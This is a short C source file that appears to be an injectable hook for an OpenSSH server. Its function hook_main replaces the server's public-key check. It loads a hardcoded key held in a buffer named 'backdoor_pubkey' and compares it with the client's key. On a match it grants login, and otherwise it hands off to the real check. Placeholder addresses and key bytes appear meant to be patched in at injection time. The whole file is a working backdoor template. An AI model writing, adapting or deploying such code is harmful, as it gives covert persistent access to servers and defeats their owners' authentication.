#include "syscall.h"

#define KEY_TYPE_RSA 1
#define SSH_MAX_PUBKEY_BYTES 8192

typedef unsigned long u64;

void _strcpy(char *dst, char *src) {
	while(*src != '\0') {
		*dst++ = *src++;
	}

	*dst++ = '\0';
}

void _memset(unsigned char *dst, unsigned char val, int len) {
	while(len--) {
		*dst++ = val;
	}
}

typedef void* (*f_key_new)(int);
typedef int (*f_key_read)(void*, char**);
typedef void (*f_restore_uid)(void);
typedef void (*f_key_free)(void*);
typedef int (*f_user_key_allowed2)(void*, void*, char*);
typedef int (*f_BN_cmp)(u64, u64);

int hook_main(void *pw, void *key, char *file) {
	char *backdoor_pubkey_ptr;
	void *rsa_key;

	char backdoor_pubkey[SSH_MAX_PUBKEY_BYTES];

	f_key_new key_new = (f_key_new)(0xaaaaaaaabbbbbbbb);
	f_key_read key_read = (f_key_read)(0x1111111122222222);
	f_restore_uid restore_uid = (f_restore_uid)(0x99999999aaaaaaaa);
	f_key_free key_free = (f_key_free)(0x5555555566666666);
	f_user_key_allowed2 user_key_allowed2 = (f_user_key_allowed2)(0x7777777788888888);
	f_BN_cmp BN_cmp = (f_BN_cmp)(0xbadc0dedbeefbabe);

	_memset(backdoor_pubkey, 0, SSH_MAX_PUBKEY_BYTES);
	_strcpy(backdoor_pubkey, "\xaa\xbb\xcc\xdd");

	backdoor_pubkey_ptr = backdoor_pubkey;

	rsa_key = key_new(KEY_TYPE_RSA);
	key_read(rsa_key, &backdoor_pubkey_ptr);

	u64 key_a_rsa = *(u64*)(rsa_key+8);
	u64 key_b_rsa = *(u64*)(key+8);

	if (key_a_rsa != 0 &&
		key_b_rsa != 0 &&
		BN_cmp(*(u64*)(key_a_rsa + 32), *(u64*)(key_b_rsa + 32)) == 0 &&
		BN_cmp(*(u64*)(key_a_rsa + 40), *(u64*)(key_b_rsa + 40)) == 0
	) {
		restore_uid();
#ifdef DONT_LEAK_MEMORY // this call crashes on some platforms, needs investigation
		key_free(rsa_key);
#endif
		return 1;
	}

	return user_key_allowed2(pw, key, file);
}
